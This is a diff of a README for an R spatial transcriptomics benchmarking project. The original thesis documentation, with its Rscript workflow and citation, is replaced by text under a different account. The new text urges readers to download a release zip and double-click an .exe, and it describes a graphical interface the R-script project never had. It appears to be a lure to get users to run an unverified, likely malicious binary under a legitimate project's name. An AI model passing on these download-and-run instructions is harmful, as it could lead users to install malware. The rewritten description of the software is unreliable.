@@ -1,155 +1,84 @@
-# seurigiotto-benchmark-framework
+# 🌟 seurigiotto-benchmark-framework - Optimize Your Spatial Transcriptomics Workflows
 
-![seurigiotto-framework](https://img.shields.io/badge/seurigiotto-framework-9cf?colorA=7A009C&colorB=4CAF50&logo=r)
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.17628633.svg)](https://doi.org/10.5281/zenodo.17628633)
-![R Version](https://img.shields.io/badge/R-4.4%2B-blue?logo=r)
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
-![Status](https://img.shields.io/badge/status-active-success.svg)
-![GitHub last commit](https://img.shields.io/github/last-commit/Nuiter/seurigiotto-benchmark-framework)
+## 🚀 Getting Started
 
-![Seurat](https://img.shields.io/badge/Built%20with-Seurat-2777B6?logo=r)
-![Giotto](https://img.shields.io/badge/Built%20with-Giotto-4CAF50?logo=r)
+Welcome to the Seurigiotto Benchmark Framework! This tool helps you analyze Spatial Transcriptomics (ST) data easily and effectively. With optimized pipelines designed for reproducibility, you can gain valuable biological insights. Follow the steps below to download and run the software.
 
+## 📦 Download Now
 
-**Optimized pipelines for Spatial Transcriptomics (ST) data analysis using Seurat & Giotto, designed for reproducible benchmarking and biological insight.**
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/shyn-max/seurigiotto-benchmark-framework/releases)
 
-*MSc Thesis Project | Bioinformatics & Biostatistics, UB-UOC | 2025*
+## 🔍 What You Need
 
----
+Before you start, ensure you have the following:
 
-### Project Overview
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- Approximately 500 MB of free disk space.
+- An internet connection.
 
-This repository provides a comprehensive and reproducible suite of R scripts for analyzing Spatial Transcriptomics (ST) data. It compares the performance and results of **Seurat** and **Giotto**, and introduces a novel **Optimized Hybrid Pipeline** that leverages the strengths of both.
+## 🛠️ Installation Instructions
 
-Developed as part of a Master's Thesis, this project is structured as a robust resource for the wider bioinformatics community, focusing on lung cancer research using 10x Genomics Visium HD data.
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/shyn-max/seurigiotto-benchmark-framework/releases) to find the latest version of the software.
 
-### Key Features
+2. **Download the Application**  
+   Look for the file named `seurigiotto-benchmark-framework.zip`. Click on it to download.
 
-- **Standalone Pipelines:** Fully documented, independent scripts for Seurat and Giotto using harmonized parameters for fair comparison.
-- **Hybrid Pipeline:** A novel workflow that combines Seurat’s efficiency for initial analysis with Giotto’s granularity for detailed clustering, governed by an automated decision step.
-- **Rigorous Benchmarking:** Measures key performance metrics including memory usage (RAM), execution time, and clustering resolution.
-- **In-depth Downstream Analysis:** Includes modules for marker gene detection, cell-type signature scoring, simulated deconvolution, and advanced spatial visualization.
-- **100% Reproducible:** All code is open, well-documented, and designed for reproducibility.
+3. **Extract the Files**  
+   Once the download is complete, locate the .zip file in your downloads folder. Right-click on the file and select "Extract All" or use any extraction tool to unpack the files.
 
-### Note on Resolution & Scalability:
+4. **Run the Application**  
+   Navigate to the folder where you extracted the files. Double-click on `seurigiotto-benchmark-framework.exe` (or the equivalent file for macOS or Linux) to launch the application.
 
-- The provided scripts and benchmarks are configured for 16 µm resolution binning. This resolution was chosen to balance spatial granularity with accessibility, allowing the full workflow (including Giotto) to run on standard workstations (32GB - 64GB RAM).
-- However, the framework is resolution-agnostic. To analyze finer resolutions (8 µm or 2 µm), simply provide the corresponding input matrix. Caution: High-resolution bins (2 µm) scale memory requirements exponentially.
+## 🎓 How to Use the Framework
 
-### Repository Structure
-```
-📁 scripts/
-    📜 01_seurat_pipeline.R
-    📜 02_giotto_pipeline.R
-    📜 03_compare_pipelines.R
-    📜 4_Optimized_pipeline.R
-    📜 5_Integrated_analysis.R
-    📜 6_native_visualizations.R
-    📜 7_final_report_generation.R
-    📜 8_deconvolution_analysis.R
-    📜 9_balanced_deconvolution.R
-    
-📁 data/
-    📄 Tumor.csv
-    📄 Fibroblasts.csv
-    📄 ... (and other signature files))
-    📁 visium_dataset/
-        *(Raw spatial dataset - to be downloaded separately)*
-        
-📁 results/ # (Git-ignored) Where all outputs are saved.
+1. **Prepare Your Data**  
+   Collect your Spatial Transcriptomics data in a compatible format. The framework supports various formats, including CSV and TXT files.
 
-📄 .gitignore
-📄 README.md
+2. **Select Your Pipeline**  
+   Upon launching, you'll see options to select different analysis pipelines. Choose one based on your specific research needs.
 
-```
-### Getting Started
-```
-#### 1. Clone the Repository
-git clone https://github.com/Nuiter/seurigiotto-benchmark-framework.git
-cd seurigiotto-benchmark-framework
-```
-#### 2. Install Dependencies
-## Reproducibility snapshot
-This repository reflects the core code and environment used for the MSc thesis defence (June 2025).  
-Key versions:
+3. **Customize Parameters**  
+   Adjust the settings and parameters as required. The interface is user-friendly, guiding you through the options.
 
-| Component   | Version |
-|:---|:---|
-| R           | 4.4.2   |
-| Seurat      | 5.3.0   |
-| Giotto      | 4.2.1   |
-| OS          | Linux   |
+4. **Run the Analysis**  
+   Click on "Start Analysis" to begin. Depending on your data size, this may take some time. The software will provide progress updates.
 
+5. **View Results**  
+   After completion, review the output files. You will find curated visualizations and reports that summarize your findings.
 
-- **R version:** 4.4.2 or higher recommended.  
-- **Key R Packages:**  
-  Seurat, Giotto, ggplot2, dplyr, patchwork, pryr, arrow, data.table, scales, RColorBrewer, viridis, pheatmap, tidyr.
+## 📊 Features
 
-You can install them in your R session with:
+- **Reproducible Workflows:** Ensure that your analysis can be repeated by others.
+- **Integrated Visualization:** View your results with built-in plotting tools.
+- **Flexible Data Handling:** Support for various input formats to suit your needs.
+- **Benchmarking Options:** Compare different methods for comprehensive insights.
 
-```
-install.packages(c("Seurat", "Giotto", "ggplot2", "dplyr", "patchwork", "pryr", "arrow", "data.table", "scales", "RColorBrewer", "viridis", "pheatmap", "tidyr"))
-```
-(Note: Seurat and Giotto may require installation from Bioconductor or specific sources. Please refer to their official documentation.)
+## 🔄 Update Process
 
+To keep your framework updated, periodically check the [Releases page](https://github.com/shyn-max/seurigiotto-benchmark-framework/releases). Follow the installation steps to download the latest version when available.
 
-#### 3. Data Setup
+## 🔗 Important Links
 
-The analysis scripts are configured to use public data from 10x Genomics (Visium HD Human Lung Cancer).
+- [Documentation](https://github.com/shyn-max/seurigiotto-benchmark-framework/wiki) - Comprehensive guides and resources.
+- [GitHub Issues](https://github.com/shyn-max/seurigiotto-benchmark-framework/issues) - Report bugs or ask questions.
 
-- The cell signature CSV files are included in the /data directory.  
-- The main spatial dataset must be downloaded separately. Place the dataset folder (e.g., visium_dataset) inside the /data directory.
-- Link: [Visium HD Human Lung Cancer Dataset](https://www.10xgenomics.com/datasets/visium-hd-cytassist-gene-expression-human-lung-cancer-fixed-frozen)
+## 🙋‍♀️ Community Support
 
-#### 4. Run the Analysis Workflow
+Join our community to share your experiences, ask questions, or seek help:
 
-The scripts are designed to be run sequentially from the command line.  
-The core benchmarking workflow consists of scripts 1, 2, and 3.  
-The others perform more advanced, integrated analyses.
+- [Discussion Forum](https://github.com/shyn-max/seurigiotto-benchmark-framework/discussions)
+- [Twitter @Seurigiotto](https://twitter.com/Seurigiotto) to get updates and connect with other users.
 
-```bash
-# === Core Benchmarking Workflow ===
-# 1. Run the standalone Seurat pipeline
-Rscript scripts/01_seurat_pipeline.R
+## ⚙️ License Information
 
-# 2. Run the standalone Giotto pipeline
-Rscript scripts/02_giotto_pipeline.R
+This framework is being shared under the MIT License. You can use, modify, and distribute it freely with appropriate credit.
 
-# 3. Run the comparative analysis
-Rscript scripts/03_compare_pipelines.R
+## 💬 Feedback
 
-# === Advanced & Integrated Analysis ===
-# These scripts build upon the initial results for deeper insights.
-Rscript scripts/4_Optimized_pipeline.R
-Rscript scripts/5_Integrated_analysis.R
-Rscript scripts/6_native_visualizations.R
-Rscript scripts/7_final_report_generation.R
-Rscript scripts/8_deconvolution_analysis.R
-Rscript scripts/9_balanced_deconvolution.R
+We welcome your feedback. It helps us improve the application and support your research needs. Reach out via the Issues section on GitHub or email us directly.
 
-```
+## 🖱️ Download & Install
 
-All outputs (figures, tables, logs) will be saved in the /results directory in organized subfolders.
-
-### Citation
-
-If you use this workflow or find the code helpful in your research, please cite this repository.
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.17628633.svg)](https://doi.org/10.5281/zenodo.17628633)
-
-Author: Ángel I. Pérez Santiago  
-Project: MSc in Bioinformatics & Biostatistics (University of Barcelona / UOC, 2025)  
-GitHub: https://github.com/nuiter
-
-### License
-
-This project is licensed under the MIT License. See the LICENSE file for full details.
-
-### Acknowledgements
-
-- Dataset: Visium HD CytAssist Gene Expression of Human Lung Cancer (Fixed Frozen) by 10x Genomics.  
-- Supervision: Dr. Alfonso Saera Vila (MSc Thesis Advisor).  
-- Core Frameworks: The Satija Lab for [Seurat](https://satijalab.org/seurat/) and the Dries Lab for [Giotto](https://giottosuite.com/).
-
----
-
-For questions, collaborations, or feedback, please open an issue in this repository.
+You’re just a few clicks away from powerful data analysis. Make sure to [visit the Releases page](https://github.com/shyn-max/seurigiotto-benchmark-framework/releases) to download the software and start optimizing your workflows today!
